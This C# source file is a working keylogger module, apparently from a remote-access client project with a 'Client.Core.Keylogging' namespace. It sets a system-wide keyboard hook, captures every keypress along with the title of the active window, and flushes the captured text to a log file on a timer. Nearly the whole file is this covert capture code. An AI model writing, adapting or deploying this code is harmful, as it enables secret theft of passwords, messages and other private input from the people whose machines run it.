using Client.Config;
using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using static Client.Core.Helper.ActiveWindowHelper;

namespace Client.Core.Keylogging
{
    class Keylogger
    {
        public static StringBuilder keylogBuffer = new StringBuilder();
        private static IKeyboardMouseEvents m_GlobalHook;
        static WinEventDelegate dele = null;
        static System.Timers.Timer flushTimer;
        private static string lastWindow; 

        public static void Start()
        {
            if(Settings.ENABLE_KEYLOG)
            {
                flushTimer = new System.Timers.Timer(Settings.KEYLOG_BUFFER_FLUSH_DELAY);
                flushTimer.Elapsed += new ElapsedEventHandler(FlushKeyLog);
                flushTimer.Enabled = true;
                flushTimer.Start();
                // Note: for the application hook, use the Hook.AppEvents() instead
                m_GlobalHook = Hook.GlobalEvents();
                m_GlobalHook.KeyPress += GlobalHookKeyPress;
                dele = new WinEventDelegate(WinEventProc);
                IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
            }
        }

        private static void FlushKeyLog(object sender, EventArgs e)
        {
            string fullFilePath = Path.Combine(Settings.KEYLOG_ROOT_PATH, Settings.KEYLOG_SUB_PATH, Settings.KEYLOG_FILE_NAME);
            string endFolderPath = Path.Combine(Settings.KEYLOG_ROOT_PATH, Settings.KEYLOG_SUB_PATH);
            if (!Directory.Exists(endFolderPath))
                Directory.CreateDirectory(endFolderPath);

            File.AppendAllText(fullFilePath, keylogBuffer.ToString());
            keylogBuffer.Clear();
        }

        public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            if (lastWindow == null)
                keylogBuffer.Append(Environment.NewLine + GetActiveWindowTitle() + Environment.NewLine);
            else if(lastWindow != GetActiveWindowTitle())
                keylogBuffer.Append(Environment.NewLine + GetActiveWindowTitle() + Environment.NewLine);
            lastWindow = GetActiveWindowTitle();
        }

        private static void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            keylogBuffer.Append(e.KeyChar);
        }
    }
}
